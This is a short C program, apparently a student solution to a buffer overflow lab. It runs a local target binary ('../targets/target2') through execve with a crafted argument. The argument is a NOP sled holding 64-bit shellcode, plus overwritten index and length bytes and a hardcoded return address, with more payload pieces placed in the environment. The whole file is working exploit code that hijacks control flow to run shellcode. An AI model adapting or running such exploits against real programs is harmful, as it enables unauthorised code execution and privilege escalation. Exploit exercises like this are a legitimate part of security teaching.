#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define buff_len	285	
#define NOP		0x90

int
main ( int argc, char * argv[] )
{
	char 	buf[buff_len];
	char *	args[3];
	char *	env[3];
	int i;
	
	memset((void*)buf, NOP, buff_len);

	// size of shellcode = 46 (minus \0 = 45)
	memcpy((void*)buf, (void*)shellcode, sizeof shellcode - 1);
	
	//Setting the lowest byte of i to skip forward
	buf[264] = '\x0b';

	char len[] = "\x1c\x01\x00\x00";
	memcpy((void*)buf+268, (void*)len, sizeof len - 1);

	char ret[] = "\x40\xfd\x21\x20";
	memcpy((void*)buf+280, (void*)ret, sizeof ret);
	
	args[0] = TARGET;
	args[1] = buf; 
	args[2] = NULL;

	env[0] = buf + 271;
	env[1] = buf + 272;
	env[2] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
